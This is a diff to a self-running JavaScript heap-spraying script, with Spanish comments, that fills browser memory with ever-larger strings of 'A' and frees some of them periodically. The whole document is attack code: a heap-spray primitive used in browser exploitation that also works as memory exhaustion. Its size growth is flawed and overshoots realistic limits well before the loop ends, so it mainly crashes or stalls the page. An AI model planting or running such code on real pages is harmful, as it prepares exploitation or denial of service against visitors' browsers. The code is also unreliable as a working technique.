@@ -1,29 +1,35 @@
 (function() {
     const sprayArray = [];
-    const objectSizeSmall = 0x444444; // Tamaño de objetos pequeños (~4 MB)
-    const objectSizeLarge = 0x888888; // Tamaño de objetos grandes (~9 MB)
-    const maxIterations = 200;
-    const fragmentationPattern = [objectSizeSmall, objectSizeLarge];
+    const baseObjectSize = 0x333333;  // Tamaño de cada bloque pequeño (~3 MB)
+    const incrementFactor = 1.05;     // Factor de incremento para cada iteración
+    const maxIterations = 1000;       // Aumentamos el número de iteraciones para impacto gradual
+    let currentObjectSize = baseObjectSize;
 
-    // Fragmentación controlada en bloques de diferente tamaño
-    for (let i = 0; i < maxIterations; i++) {
-        // Alternar tamaños entre iteraciones para crear fragmentación
-        let currentSize = fragmentationPattern[i % fragmentationPattern.length];
-        let sprayObject = "A".repeat(currentSize);
+    function incrementalSpray(iteration) {
+        if (iteration >= maxIterations) {
+            console.log("Heap spraying completado de forma incremental.");
+            alert("Proceso de heap spraying finalizado.");
+            return;
+        }
+
+        // Crear objeto con tamaño incremental
+        let sprayObject = "A".repeat(Math.floor(currentObjectSize));
         sprayArray.push(sprayObject);
 
-        // Liberar memoria periódicamente para no llegar al límite
-        if (i % 50 === 0 && i !== 0) {
-            console.log(`Liberando memoria en iteración ${i}`);
-            sprayArray.splice(0, 25); // Liberar una parte de los objetos en lugar de todos
+        console.log(`Iteración ${iteration + 1}: Tamaño actual del objeto: ${currentObjectSize.toString(16)}`);
+
+        // Incrementar el tamaño del siguiente objeto
+        currentObjectSize *= incrementFactor;
+
+        // Liberación parcial cada 100 iteraciones
+        if (iteration % 100 === 0 && iteration !== 0) {
+            console.log(`Liberando memoria parcialmente en iteración ${iteration}`);
+            sprayArray.splice(0, 25); // Liberación parcial de los objetos más antiguos
         }
 
-        // Log para monitorear el progreso
-        if (i % 20 === 0) {
-            console.log(`Iteración ${i + 1} completada. Tamaño actual: ${currentSize.toString(16)}`);
-        }
+        // Ejecutar siguiente iteración después de una breve pausa
+        setTimeout(() => incrementalSpray(iteration + 1), 50); // Pausa de 50 ms entre cada incremento
     }
 
-    console.log("Heap spraying con fragmentación controlada completado.");
-    alert("Heap spraying con fragmentación finalizado.");
+    incrementalSpray(0);
 })();
